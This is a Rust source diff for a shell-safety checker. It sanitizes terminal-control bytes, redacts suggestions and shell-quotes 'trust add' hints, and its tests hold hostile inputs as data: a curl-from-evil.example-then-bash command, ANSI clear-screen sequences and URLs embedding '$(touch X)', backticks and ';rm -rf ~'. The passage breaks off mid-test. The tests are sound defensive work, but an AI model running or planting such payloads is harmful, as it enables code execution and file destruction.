@@ -1,18 +1,23 @@
 use std::io::Write;
 
 use crate::safe_command::SafeSuggestion;
-use crate::verdict::{Action, Evidence, Finding, Verdict};
+use crate::verdict::{Action, Evidence, Finding, RuleId, Verdict};
 
 const SCHEMA_VERSION: u32 = 3;
 
-/// A [`Finding`] serialized with its per-rule `remediation` appended.
-///
-/// `remediation` is the canonical "what to do instead" advice keyed by
-/// `rule_id` (see [`crate::rule_explanations::remediation`]). It is static,
-/// secret-free text, so it needs no redaction. Serializing through this view
-/// keeps the on-disk [`Finding`] struct (and every other consumer of it —
-/// SARIF, audit, last-trigger) unchanged: remediation appears only in the
-/// `check`/`paste` JSON surface, exactly where it is asked for.
+/// Strip terminal-control bytes from an untrusted finding field before it is
+/// written to a terminal. `finding.description` embeds the offending URL/payload
+/// verbatim (engine.rs), so a blocklisted URL carrying ANSI/OSC/zero-width could
+/// otherwise repaint the user's terminal at warn time. Reuses the MCP filter's
+/// scrubber so both surfaces sanitize identically.
+fn sanitize_field(s: &str) -> String {
+    crate::mcp::output_filter::sanitize_text_str(s)
+}
+
+/// A [`Finding`] serialized with its per-rule `remediation` appended. The
+/// remediation text is static and secret-free (no redaction needed); this view
+/// confines it to the `check`/`paste` JSON surface, leaving every other
+/// `Finding` consumer (SARIF, audit, last-trigger) unchanged.
 #[derive(serde::Serialize)]
 pub struct FindingView<'a> {
     #[serde(flatten)]
@@ -45,12 +50,38 @@ pub struct JsonOutput<'a> {
     pub timings_ms: &'a crate::verdict::Timings,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub urls_extracted_count: Option<usize>,
-    /// Concrete safer-command suggestions. Present (as a JSON array, possibly
-    /// empty) whenever the caller passed `--suggest-safe-command`; omitted
-    /// entirely otherwise. The array is empty when no finding has a safe
-    /// mechanical rewrite — including on an Allow verdict.
+    /// Safer-command suggestions: a (possibly empty) array when the caller
+    /// passed `--suggest-safe-command`, omitted otherwise. These are owned
+    /// redacted copies (not borrowed) because a suggestion's `safe_command`
+    /// can re-embed the original command/URL/path, so it must run through the
+    /// same `custom_patterns` redaction as `findings` before it is serialized.
+    /// See [`redact_suggestion`].
     #[serde(skip_serializing_if = "Option::is_none")]
-    pub safe_suggestions: Option<&'a [SafeSuggestion]>,
+    pub safe_suggestions: Option<Vec<SafeSuggestion>>,
+}
+
+/// Return a redacted clone of a [`SafeSuggestion`] for JSON output.
+///
+/// `safe_command` re-embeds the user's original command/URL/path (the
+/// pipe-to-shell, sudo-narrow, env-scrub, archive, and dotfile rewrites all
+/// splice attacker- or user-controlled input back in), and `rationale` is a
+/// per-rule string that some transforms (env-scrub) build with a runtime value.
+/// Both are therefore scrubbed with the SAME `custom_patterns` the caller uses
+/// for `findings`, via [`crate::redact::redact_with_custom`] (the exact
+/// primitive `redact_finding` applies to a finding's free-text fields).
+///
+/// `rule_id` (a fixed snake_case rule name) and `remediation` (static per-rule
+/// advice) are secret-free by construction and pass through unchanged.
+fn redact_suggestion(s: &SafeSuggestion, custom_patterns: &[String]) -> SafeSuggestion {
+    SafeSuggestion {
+        rule_id: s.rule_id.clone(),
+        safe_command: s
+            .safe_command
+            .as_deref()
+            .map(|c| crate::redact::redact_with_custom(c, custom_patterns)),
+        rationale: crate::redact::redact_with_custom(&s.rationale, custom_patterns),
+        remediation: s.remediation.clone(),
+    }
 }
 
 /// Write verdict as JSON to the given writer.
@@ -63,9 +94,7 @@ pub fn write_json(
 }
 
 /// Write verdict as JSON, optionally embedding safe-command suggestions.
-///
-/// `suggestions` is `Some` only when the caller requested
-/// `--suggest-safe-command`; passing `None` is identical to [`write_json`].
+/// `None` is identical to [`write_json`].
 pub fn write_json_with_suggestions(
     verdict: &Verdict,
     custom_patterns: &[String],
@@ -74,6 +103,15 @@ pub fn write_json_with_suggestions(
 ) -> std::io::Result<()> {
     let redacted_findings = crate::redact::redacted_findings(&verdict.findings, custom_patterns);
     let findings: Vec<FindingView> = redacted_findings.iter().map(FindingView::of).collect();
+    // A SafeSuggestion's `safe_command` re-embeds the original command/URL/path,
+    // so it would reintroduce exactly the secrets `custom_patterns` redacted out
+    // of `findings`. Redact each suggestion with the same patterns before it is
+    // serialized (see `redact_suggestion`).
+    let safe_suggestions = suggestions.map(|sugg| {
+        sugg.iter()
+            .map(|s| redact_suggestion(s, custom_patterns))
+            .collect::<Vec<_>>()
+    });
     let output = JsonOutput {
         schema_version: SCHEMA_VERSION,
         action: verdict.action,
@@ -85,7 +123,7 @@ pub fn write_json_with_suggestions(
         policy_path_used: &verdict.policy_path_used,
         timings_ms: &verdict.timings_ms,
         urls_extracted_count: verdict.urls_extracted_count,
-        safe_suggestions: suggestions,
+        safe_suggestions,
     };
     serde_json::to_writer(&mut w, &output)?;
     writeln!(w)?;
@@ -94,11 +132,10 @@ pub fn write_json_with_suggestions(
 
 /// Write human-readable verdict to stderr.
 ///
-/// `warn_only` indicates the caller cannot actually enforce a block (e.g. bash
-/// preexec `DEBUG` trap). In that mode, Block verdicts render as `DETECTED
-/// (shell hook cannot block in preexec mode — command will still run)` instead
-/// of `BLOCKED`, and the bypass hint line is rewritten accordingly. The flag
-/// is human-only — it MUST never reach `write_json`, audit logs, or exit codes.
+/// `warn_only` (caller cannot enforce a block, e.g. bash preexec `DEBUG` trap)
+/// renders Block as `DETECTED (... command will still run)` instead of `BLOCKED`
+/// and rewrites the bypass hint. Human-only — it MUST never reach `write_json`,
+/// audit logs, or exit codes.
 pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std::io::Result<()> {
     if verdict.findings.is_empty() {
         return Ok(());
@@ -123,10 +160,15 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
     for finding in &verdict.findings {
         let sev = crate::style::severity_label(&finding.severity, crate::style::Stream::Stderr);
 
-        writeln!(w, "  {} {} — {}", sev, finding.rule_id, finding.title)?;
-        writeln!(w, "    {}", finding.description)?;
+        writeln!(
+            w,
+            "  {} {} — {}",
+            sev,
+            finding.rule_id,
+            sanitize_field(&finding.title)
+        )?;
+        writeln!(w, "    {}", sanitize_field(&finding.description))?;
 
-        // Display detailed evidence for homoglyph findings
         for evidence in &finding.evidence {
             if let Evidence::HomoglyphAnalysis {
                 raw,
@@ -135,7 +177,6 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
             } = evidence
             {
                 writeln!(w)?;
-                // Visual line with markers
                 let visual = format_visual_with_markers(raw, suspicious_chars);
                 writeln!(w, "    Visual:  {visual}")?;
                 let esc_styled = if crate::style::use_color_for(crate::style::Stream::Stderr) {
@@ -145,7 +186,6 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
                 };
                 writeln!(w, "    Escaped: {esc_styled}")?;
 
-                // Suspicious bytes section
                 if !suspicious_chars.is_empty() {
                     writeln!(w)?;
                     let header =
@@ -162,12 +202,15 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
             }
         }
 
-        // Per-rule remediation — concise "what to do instead" line.
         let fix = crate::rule_explanations::remediation(finding.rule_id);
         if !fix.is_empty() {
             let label = crate::style::bold("Fix:", crate::style::Stream::Stderr);
             writeln!(w, "    {label} {fix}")?;
         }
+    }
+
+    if verdict.action == Action::Block {
+        write_block_advisories(verdict, &mut w)?;
     }
 
     if verdict.action == Action::Block && verdict.bypass_available {
@@ -187,8 +230,148 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
     Ok(())
 }
 
+/// True for the destructive-filesystem and fetch-pipe rules whose presence in a
+/// Block verdict warrants the blast-radius header (item 14c). Covers the whole
+/// `Blast*` family (both the hot-path `cheap_check` rules and the
+/// `tirith preview` simulator rules, so a preview verdict reads the same) and
+/// every pipe-to-interpreter variant. This list is hand-maintained: `matches!`
+/// falls through to `false`, so a new destructive/fetch RuleId added to the enum
+/// will silently NOT get the blast-radius header until it is added here.
+fn is_destructive_or_fetch_pipe(r: RuleId) -> bool {
+    matches!(
+        r,
+        RuleId::BlastDeletesOutsideRepo
+            | RuleId::BlastWritesSystemPath
+            | RuleId::BlastSymlinkTraversal
+            | RuleId::BlastEmptyVarGlob
+            | RuleId::BlastFindDelete
+            | RuleId::BlastRsyncDelete
+            | RuleId::BlastLargeFileCount
+            | RuleId::PipeToInterpreter
+            | RuleId::CurlPipeShell
+            | RuleId::WgetPipeShell
+            | RuleId::HttpiePipeShell
+            | RuleId::XhPipeShell
+    )
+}
+
+/// Shared advisory block appended to a `Block` verdict by both `write_human` and
+/// `write_human_no_color` (presentation only — no detection/verdict logic).
+///
+/// Emits, in order:
+/// * **14c blast-radius header** — when the verdict ALREADY contains any
+///   destructive/fetch-pipe finding (the engine ran `blast_radius::cheap_check`
+///   on the exec path, so this only summarizes existing findings; it never
+///   recomputes). One line, pointing at `tirith preview`.
+/// * **14a "To allow" line** — the first finding carrying a URL or host in its
+///   evidence yields a copy-pasteable `tirith trust add` invocation. A full URL
+///   is a NARROW trust pattern (no `--broad`); a bare domain needs `--broad`
+///   because `trust add` rejects bare domains otherwise. Findings without any
+///   URL/host (e.g. a destructive-fs block) emit no line.
+///
+/// Both lines are part of the BLOCK verdict the user must see — unconditional,
+/// never gated on a quiet flag.
+fn write_block_advisories(verdict: &Verdict, mut w: impl Write) -> std::io::Result<()> {
+    // 14c — summarize the destructive/fetch-pipe findings already in the verdict.
+    let destructive_count = verdict
+        .findings
+        .iter()
+        .filter(|f| is_destructive_or_fetch_pipe(f.rule_id))
+        .count();
+    if destructive_count > 0 {
+        writeln!(
+            w,
+            "  blast radius: {destructive_count} finding(s) here can destroy files or run remote code — preview with `tirith preview -- <cmd>`"
+        )?;
+    }
+
+    // 14a — first finding with a URL or host in its evidence yields a trust hint.
+    for finding in &verdict.findings {
+        let rule = finding.rule_id; // snake_case via Display
+                                    // Prefer a full URL: it is a NARROW trust pattern, so no `--broad`.
+        if let Some(url) = first_url_in_evidence(&finding.evidence) {
+            // The URL is attacker-controlled and the line is meant to be
+            // copy/pasted into a shell, so it MUST be shell-single-quoted: a URL
+            // carrying `$( )`, backticks, `;`, spaces, a `>` redirect, or a glob
+            // would otherwise execute the moment the developer pastes it.
+            // `sanitize_field` (terminal-control scrub, kept for display defense)
+            // is NOT a shell escaper. If the target can't be safely single-quoted
+            // (e.g. it contains a newline), refuse to print a runnable command. And
+            // if the scrub CHANGED the target (zero-width/control bytes stripped),
+            // a `trust add <scrubbed>` would trust a DIFFERENT target than the one
+            // that was blocked, so fall back to the manual message rather than
+            // emit a misleading command.
+            let sanitized = sanitize_field(url);
+            let quoted = if sanitized == url {
+                crate::safe_command::shell_single_quote(&sanitized)
+            } else {
+                None
+            };
+            match quoted {
+                Some(quoted) => writeln!(
+                    w,
+                    "  To allow: tirith trust add {quoted} --rule {rule} --ttl 30d"
+                )?,
+                None => writeln!(
+                    w,
+                    "  To allow: trust this target manually with `tirith trust add` \
+                     (it contains characters unsafe to embed in a suggested command)."
+                )?,
+            }
+            break;
+        }
+        // Else fall back to a bare domain; `trust add` rejects bare domains
+        // without `--broad`, and `--broad` trusts the whole domain.
+        let domains = crate::session_warnings::extract_domains_from_evidence(&finding.evidence);
+        if let Some(domain) = domains.first() {
+            // Same shell-injection hazard as the URL branch: single-quote the
+            // attacker-controlled domain before it lands in a pasteable command,
+            // and fall back to the manual message if the scrub changed the target
+            // (a `trust add <scrubbed>` would trust a different domain than blocked).
+            let sanitized = sanitize_field(domain);
+            let quoted = if &sanitized == domain {
+                crate::safe_command::shell_single_quote(&sanitized)
+            } else {
+                None
+            };
+            match quoted {
+                Some(quoted) => writeln!(
+                    w,
+                    "  To allow (trusts the whole domain): tirith trust add {quoted} --broad --rule {rule} --ttl 30d"
+                )?,
+                None => writeln!(
+                    w,
+                    "  To allow: trust this target manually with `tirith trust add` \
+                     (it contains characters unsafe to embed in a suggested command)."
+                )?,
+            }
+            break;
+        }
+    }
+
+    Ok(())
+}
+
+/// The raw string of the first `Evidence::Url` in a finding's evidence, if any.
+/// This is the only `Evidence` variant that carries a full URL verbatim; host-
+/// only variants (`HostComparison`) are handled by the domain fallback in
+/// [`write_block_advisories`].
+fn first_url_in_evidence(evidence: &[Evidence]) -> Option<&str> {
+    evidence.iter().find_map(|ev| match ev {
+        Evidence::Url { raw } => Some(raw.as_str()),
+        _ => None,
+    })
+}
+
 /// Format a string highlighting suspicious characters — red background when
 /// color is enabled, bracket-wrapped (`[x]`) when color is off.
+///
+/// `raw` is untrusted (the offending input verbatim), so it is scrubbed of
+/// terminal-control / zero-width bytes before emission, mirroring the
+/// title/description sanitization (F11). Marker placement stays byte-exact: each
+/// run of non-suspicious chars is sanitized as a unit (so multi-byte ESC
+/// sequences are stripped whole, not split), and the marker boundaries are keyed
+/// off the ORIGINAL `raw` byte offsets, so the highlight never desyncs.
 fn format_visual_with_markers(
     raw: &str,
     suspicious_chars: &[crate::verdict::SuspiciousChar],
@@ -199,23 +382,36 @@ fn format_visual_with_markers(
     let use_color = crate::style::use_color_for(crate::style::Stream::Stderr);
 
     let mut result = String::new();
+    let mut run = String::new();
     let mut byte_offset = 0;
 
     for ch in raw.chars() {
         if suspicious_offsets.contains(&byte_offset) {
+            // Flush the pending (untrusted) run through the sanitizer as a unit so
+            // any multi-byte escape sequence is removed whole.
+            if !run.is_empty() {
+                result.push_str(&sanitize_field(&run));
+                run.clear();
+            }
+            // Suspicious chars are confusable letters (non-ASCII), never ASCII
+            // escape introducers, so a single-char scrub is safe here.
+            let safe = sanitize_field(ch.encode_utf8(&mut [0u8; 4]));
             if use_color {
                 result.push_str("\x1b[41m\x1b[97m"); // red bg, white fg
-                result.push(ch);
+                result.push_str(&safe);
                 result.push_str("\x1b[0m");
             } else {
                 result.push('[');
-                result.push(ch);
+                result.push_str(&safe);
                 result.push(']');
             }
         } else {
-            result.push(ch);
+            run.push(ch);
         }
         byte_offset += ch.len_utf8();
+    }
+    if !run.is_empty() {
+        result.push_str(&sanitize_field(&run));
     }
 
     result
@@ -231,12 +427,9 @@ pub fn write_human_auto(verdict: &Verdict, warn_only: bool) -> std::io::Result<(
     }
 }
 
-/// Write the `--suggest-safe-command` block to the given writer.
-///
-/// For each suggestion, prints a concrete safer command when one exists, or an
-/// honest "no automatic rewrite" line otherwise — always followed by the
-/// per-rule remediation. Does nothing when `suggestions` is empty. Advisory
-/// output only; never affects exit codes.
+/// Write the `--suggest-safe-command` block: a safer command when one exists,
+/// else an honest "no automatic rewrite" line, plus the per-rule remediation.
+/// Advisory output only; never affects exit codes.
 pub fn write_safe_suggestions(
     suggestions: &[SafeSuggestion],
     mut w: impl Write,
@@ -255,8 +448,6 @@ pub fn write_safe_suggestions(
         if let Some(cmd) = &s.safe_command {
             writeln!(w, "    {} {cmd}", crate::style::bold("try:", stream))?;
         }
-        // `rationale` is self-contained: for a rewrite it explains why the
-        // rewrite is safer; with no rewrite it states no safe rewrite exists.
         writeln!(w, "    why: {}", s.rationale)?;
         if !s.remediation.is_empty() {
             writeln!(
@@ -300,11 +491,12 @@ fn write_human_no_color(
         writeln!(
             w,
             "  [{}] {} — {}",
-            finding.severity, finding.rule_id, finding.title
+            finding.severity,
+            finding.rule_id,
+            sanitize_field(&finding.title)
         )?;
-        writeln!(w, "    {}", finding.description)?;
+        writeln!(w, "    {}", sanitize_field(&finding.description))?;
 
-        // Display detailed evidence for homoglyph findings (no color)
         for evidence in &finding.evidence {
             if let Evidence::HomoglyphAnalysis {
                 raw,
@@ -313,12 +505,10 @@ fn write_human_no_color(
             } = evidence
             {
                 writeln!(w)?;
-                // Visual line with markers (using brackets instead of color)
                 let visual = format_visual_with_brackets(raw, suspicious_chars);
                 writeln!(w, "    Visual:  {visual}")?;
                 writeln!(w, "    Escaped: {escaped}")?;
 
-                // Suspicious bytes section
                 if !suspicious_chars.is_empty() {
                     writeln!(w)?;
                     writeln!(w, "    Suspicious bytes:")?;
@@ -333,11 +523,14 @@ fn write_human_no_color(
             }
         }
 
-        // Per-rule remediation — concise "what to do instead" line.
         let fix = crate::rule_explanations::remediation(finding.rule_id);
         if !fix.is_empty() {
             writeln!(w, "    Fix: {fix}")?;
         }
+    }
+
+    if verdict.action == Action::Block {
+        write_block_advisories(verdict, &mut w)?;
     }
 
     if verdict.action == Action::Block && verdict.bypass_available {
@@ -357,7 +550,13 @@ fn write_human_no_color(
     Ok(())
 }
 
-/// Format a string with brackets around suspicious characters (for no-color mode)
+/// Format a string with brackets around suspicious characters (for no-color mode).
+///
+/// `raw` is untrusted, so it is scrubbed of terminal-control / zero-width bytes
+/// before emission (F11). Marker placement stays byte-exact: each run of
+/// non-suspicious chars is sanitized as a unit (so multi-byte ESC sequences are
+/// stripped whole, not split), and the bracket boundaries are keyed off the
+/// ORIGINAL `raw` byte offsets, so the highlight never desyncs.
 fn format_visual_with_brackets(
     raw: &str,
     suspicious_chars: &[crate::verdict::SuspiciousChar],
@@ -367,17 +566,26 @@ fn format_visual_with_brackets(
     let suspicious_offsets: HashSet<usize> = suspicious_chars.iter().map(|sc| sc.offset).collect();
 
     let mut result = String::new();
+    let mut run = String::new();
     let mut byte_offset = 0;
 
     for ch in raw.chars() {
         if suspicious_offsets.contains(&byte_offset) {
+            if !run.is_empty() {
+                result.push_str(&sanitize_field(&run));
+                run.clear();
+            }
+            let safe = sanitize_field(ch.encode_utf8(&mut [0u8; 4]));
             result.push('[');
-            result.push(ch);
+            result.push_str(&safe);
             result.push(']');
         } else {
-            result.push(ch);
+            run.push(ch);
         }
         byte_offset += ch.len_utf8();
+    }
+    if !run.is_empty() {
+        result.push_str(&sanitize_field(&run));
     }
 
     result
@@ -527,6 +735,62 @@ mod tests {
     }
 
     #[test]
+    fn write_json_with_suggestions_redacts_custom_pattern_in_safe_command() {
+        // A SafeSuggestion's `safe_command` re-embeds the original command/URL,
+        // so a secret the caller asked to redact via `custom_patterns` would be
+        // reintroduced verbatim into JSON unless the suggestion is redacted too.
+        // Build a suggestion whose rewrite carries the secret, then assert the
+        // raw secret never reaches the serialized output (only `[REDACTED:...]`),
+        // while the suggestion structure (rule_id + the safe_command key) stays.
+        let verdict = block_verdict_with_bypass();
+        let secret = "SECRET123";
+        let custom = vec![secret.to_string()];
+        let sugg = vec![SafeSuggestion {
+            rule_id: "curl_pipe_shell".to_string(),
+            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL spliced
+            // back into the rewrite. Here the URL carries the custom-pattern token.
+            safe_command: Some(format!(
+                "curl -fsSL -o /tmp/tirith-review.sh 'https://evil.example/{secret}' && \
+                 less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh"
+            )),
+            // Also plant it in the rationale (env-scrub builds this at runtime).
+            rationale: format!("downloads {secret} for review"),
+            remediation: "review before running".to_string(),
+        }];
+
+        let mut buf = Vec::new();
+        write_json_with_suggestions(&verdict, &custom, Some(&sugg), &mut buf).unwrap();
+        let raw = String::from_utf8(buf).unwrap();
+
+        // The raw secret must NOT survive anywhere in the serialized JSON.
+        assert!(
+            !raw.contains(secret),
+            "custom-pattern secret must be redacted out of safe_suggestions JSON: {raw}"
+        );
+        // The redaction marker proves the scrub ran (not that the field was dropped).
+        assert!(
+            raw.contains("[REDACTED:custom]"),
+            "redacted safe_command must carry the custom redaction marker: {raw}"
+        );
+
+        // The suggestion structure must remain intact: array present, with the
+        // rule_id and a (now-redacted) safe_command key still serialized.
+        let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
+        let arr = v["safe_suggestions"].as_array().unwrap();
+        assert_eq!(arr.len(), 1);
+        assert_eq!(arr[0]["rule_id"], "curl_pipe_shell");
+        let sc = arr[0]["safe_command"]
+            .as_str()
+            .expect("safe_command must still be present (redacted, not dropped)");
+        assert!(
+            !sc.contains(secret) && sc.contains("[REDACTED:custom]"),
+            "safe_command must be the redacted rewrite: {sc}"
+        );
+        // The static, secret-free fields pass through unchanged.
+        assert_eq!(arr[0]["remediation"], "review before running");
+    }
+
+    #[test]
     fn human_output_includes_fix_line() {
         let verdict = block_verdict_with_bypass();
         let mut buf = Vec::new();
@@ -549,6 +813,481 @@ mod tests {
         let mut buf = Vec::new();
         write_safe_suggestions(&[], &mut buf).unwrap();
         assert!(buf.is_empty(), "no suggestions → no output");
+    }
+
+    #[test]
+    fn human_output_sanitizes_terminal_control_in_finding_fields() {
+        // engine.rs embeds the offending URL/payload verbatim into a finding's
+        // title/description. A blocklisted URL carrying terminal-control bytes
+        // (here clear-screen + cursor-home) must be scrubbed before it is
+        // written to the terminal (F11) — no raw ESC may reach the writer.
+        let evil = "\x1b[2J\x1b[1;1Hwiped";
+        let verdict = Verdict::from_findings(
+            vec![Finding {
+                rule_id: RuleId::PlainHttpToSink,
+                severity: Severity::High,
+                title: format!("Blocklisted URL {evil}"),
+                description: format!("matched http://evil.example/{evil}/x.sh"),
+                evidence: vec![Evidence::Url {
+                    raw: "http://evil.example/x.sh".to_string(),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            3,
+            Timings::default(),
+        );
+
+        // no-color path
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        assert!(
+            !buf.contains(&0x1b),
+            "no-color human output must strip raw ESC from finding fields"
+        );
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains("Blocklisted URL") && out.contains("wiped"),
+            "surrounding text must survive sanitization: {out}"
+        );
+
+        // color path (write_human emits its own SGR for styling, so we only
+        // assert the untrusted payload's clear-screen/cursor-home are gone).
+        let mut cbuf = Vec::new();
+        write_human(&verdict, false, &mut cbuf).unwrap();
+        let cout = String::from_utf8(cbuf).unwrap();
+        assert!(
+            !cout.contains("\x1b[2J") && !cout.contains("\x1b[1;1H"),
+            "color human output must strip the attacker's CSI sequences: {cout}"
+        );
+    }
+
+    #[test]
+    fn visual_line_sanitizes_terminal_control_in_homoglyph_raw() {
+        use crate::verdict::SuspiciousChar;
+
+        // Evidence::HomoglyphAnalysis.raw is the offending input verbatim, so a
+        // payload that embeds a clear-screen CSI must be scrubbed before the
+        // `Visual:` line reaches the terminal (F11). `raw` = "gіtESC[2Jub" where
+        // 'і' is Cyrillic (U+0456, 2 bytes) at byte offset 1; the CSI lives in the
+        // non-suspicious tail and must be stripped whole (no residual `[2J`).
+        let raw = "gіt\x1b[2Jub".to_string();
+        let suspicious = vec![SuspiciousChar {
+            offset: 1,
+            character: 'і',
+            codepoint: "U+0456".to_string(),
+            description: "Cyrillic 'і' (looks like Latin 'i')".to_string(),
+            hex_bytes: "d1 96".to_string(),
+        }];
+        let verdict = Verdict::from_findings(
+            vec![Finding {
+                rule_id: RuleId::MixedScriptInLabel,
+                severity: Severity::High,
+                title: "Mixed-script hostname".to_string(),
+                description: "homograph".to_string(),
+                evidence: vec![Evidence::HomoglyphAnalysis {
+                    raw,
+                    // Keep `escaped` ASCII so the Escaped line can't be the source
+                    // of any ESC byte the assertions catch.
+                    escaped: "githubub".to_string(),
+                    suspicious_chars: suspicious,
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            3,
+            Timings::default(),
+        );
+
+        // no-color path: the formatter emits only brackets, so no ESC at all may
+        // appear anywhere in the output.
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        assert!(
+            !buf.contains(&0x1b),
+            "no-color Visual line must strip raw ESC from homoglyph raw"
+        );
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains("Visual:") && out.contains("[і]"),
+            "the suspicious char must still be bracket-marked: {out}"
+        );
+        assert!(
+            !out.contains("[2J"),
+            "the clear-screen CSI must be stripped whole, no residual: {out}"
+        );
+
+        // color path: write_human emits its own SGR for styling, so we assert the
+        // attacker's specific clear-screen CSI is gone (not "no ESC at all").
+        let mut cbuf = Vec::new();
+        write_human(&verdict, false, &mut cbuf).unwrap();
+        let cout = String::from_utf8(cbuf).unwrap();
+        assert!(
+            !cout.contains("\x1b[2J"),
+            "color Visual line must strip the attacker's clear-screen CSI: {cout}"
+        );
+    }
+
+    /// Helper: a Block verdict carrying a single finding with the given rule and
+    /// evidence, mirroring `block_verdict_with_bypass`'s field initialization.
+    fn block_verdict_with_evidence(rule_id: RuleId, evidence: Vec<Evidence>) -> Verdict {
+        let mut v = Verdict::from_findings(
+            vec![Finding {
+                rule_id,
+                severity: Severity::High,
+                title: "t".to_string(),
+                description: "d".to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            3,
+            Timings::default(),
+        );
+        v.action = Action::Block;
+        v.bypass_available = true;
+        v
+    }
+
+    #[test]
+    fn block_with_full_url_renders_to_allow_without_broad() {
+        // 14a: a finding carrying a full URL emits the NARROW trust line — the
+        // exact URL (single-quoted), the snake_case rule id, a 30d TTL, and NO
+        // `--broad`.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                raw: "https://bit.ly/x".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                out.contains(
+                    "To allow: tirith trust add 'https://bit.ly/x' --rule shortened_url --ttl 30d"
+                ),
+                "full-URL block must render the narrow, single-quoted To-allow line (color={color}): {out}"
+            );
+            assert!(
+                !out.contains("--broad"),
+                "a full URL is a narrow trust pattern — no --broad (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_with_bare_domain_only_renders_broad_to_allow() {
+        // 14a: a finding with only a HOST (no full URL) must emit the domain form
+        // WITH `--broad` (single-quoted), because `trust add` rejects bare domains
+        // otherwise.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ConfusableDomain,
+            vec![Evidence::HostComparison {
+                raw_host: "gіthub.com".to_string(),
+                similar_to: "github.com".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains(
+                "To allow (trusts the whole domain): tirith trust add 'gіthub.com' --broad --rule confusable_domain --ttl 30d"
+            ),
+            "bare-domain block must render the single-quoted --broad To-allow line: {out}"
+        );
+    }
+
+    #[test]
+    fn block_with_url_and_host_prefers_full_url_no_broad() {
+        // When both a full URL and a host are present, the full URL wins (narrow,
+        // no --broad, single-quoted) and only ONE To-allow line is emitted.
+        let verdict = block_verdict_with_evidence(
+            RuleId::PlainHttpToSink,
+            vec![
+                Evidence::HostComparison {
+                    raw_host: "evil.example".to_string(),
+                    similar_to: "ok.example".to_string(),
+                },
+                Evidence::Url {
+                    raw: "http://evil.example/x.sh".to_string(),
+                },
+            ],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains(
+                "tirith trust add 'http://evil.example/x.sh' --rule plain_http_to_sink --ttl 30d"
+            ),
+            "full URL must be preferred over the host: {out}"
+        );
+        assert!(
+            !out.contains("--broad"),
+            "full-URL path must not use --broad: {out}"
+        );
+        assert_eq!(
+            out.matches("To allow").count(),
+            1,
+            "exactly one To-allow line: {out}"
+        );
+    }
+
+    #[test]
+    fn block_to_allow_url_shell_quotes_injection_payloads() {
+        // F1 (HIGH): the To-allow line is meant to be copy/pasted into a shell,
+        // so an attacker-controlled URL carrying shell metacharacters must be
+        // single-quoted — a developer who pastes the suggested line must NOT
+        // trigger command substitution, separators, redirects, or globbing.
+        let hostile = [
+            "https://x/$(touch X)",
+            "https://x/`id`",
+            "https://x/a;rm -rf ~",
+            "https://x/a b",
+            "https://x/a'b",
+            "https://x/a>b",
+            "https://x/a*b",
+        ];
+        for raw in hostile {
+            let verdict = block_verdict_with_evidence(
+                RuleId::ShortenedUrl,
+                vec![Evidence::Url {
+                    raw: raw.to_string(),
+                }],
+            );
+            for color in [false, true] {
+                let mut buf = Vec::new();
+                if color {
+                    write_human(&verdict, false, &mut buf).unwrap();
+                } else {
+                    write_human_no_color(&verdict, false, &mut buf).unwrap();
+                }
+                let out = String::from_utf8(buf).unwrap();
+                let line = out
+                    .lines()
+                    .find(|l| l.contains("tirith trust add"))
+                    .unwrap_or_else(|| {
+                        panic!("no To-allow line for {raw:?} (color={color}): {out}")
+                    });
+                // The emitted token is the single-quoted form of the URL. A
+                // single quote in the URL is escaped as '\'' (still one token).
+                let expected_token =
+                    crate::safe_command::shell_single_quote(raw).expect("quotable URL");
+                assert!(
+                    line.contains(&expected_token),
+                    "URL must be single-quoted on the To-allow line so a shell would NOT \
+                     expand it (raw={raw:?}, color={color}): {line}"
+                );
+                // The dangerous fragment must never appear UNquoted (outside the
+                // single-quoted token), which is what would let it execute.
+                let outside = line.replace(&expected_token, "");
+                for needle in ["$(", "`", ";rm", " a b", ">b", "*b"] {
+                    assert!(
+                        !outside.contains(needle),
+                        "no bare {needle:?} may survive outside the quoted token \
+                         (raw={raw:?}): {line}"
+                    );
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn block_to_allow_domain_shell_quotes_injection_payloads() {
+        // F1 (HIGH): same neutralization on the bare-domain (`--broad`) branch.
+        // `extract_domains_from_evidence` pulls the host from `raw_host`, so plant
+        // the hostile metacharacters there.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ConfusableDomain,
+            vec![Evidence::HostComparison {
+                raw_host: "evil.example/$(touch X)".to_string(),
+                similar_to: "ok.example".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
